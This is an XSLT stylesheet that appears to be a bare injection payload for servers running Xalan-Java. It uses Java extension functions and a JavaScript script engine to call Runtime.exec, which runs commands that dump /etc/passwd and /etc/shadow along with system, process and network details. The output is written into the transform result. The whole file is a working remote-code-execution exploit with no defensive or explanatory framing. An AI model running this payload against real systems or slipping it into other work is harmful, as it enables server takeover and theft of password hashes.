<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:j="http://xml.apache.org/xalan/java" exclude-result-prefixes="j"
>
    <xsl:template match="/">
        <xsl:variable name="sem" select="j:javax.script.ScriptEngineManager.new()"/>
        <xsl:variable name="se" select="j:getEngineByName($sem, 'JavaScript')"/>
        <xsl:variable name="js">
        <![CDATA[
            new java.util.Scanner(
                java.lang.Runtime.getRuntime().exec("cat /etc/passwd;cat /etc/shadow; uname -a ; ps aux; ifconfig").getInputStream()
            ).useDelimiter("\\Z").next()
        ]]>
        </xsl:variable>
        <xsl:value-of select="j:eval($se, $js)"/>
    </xsl:template>
</xsl:stylesheet>
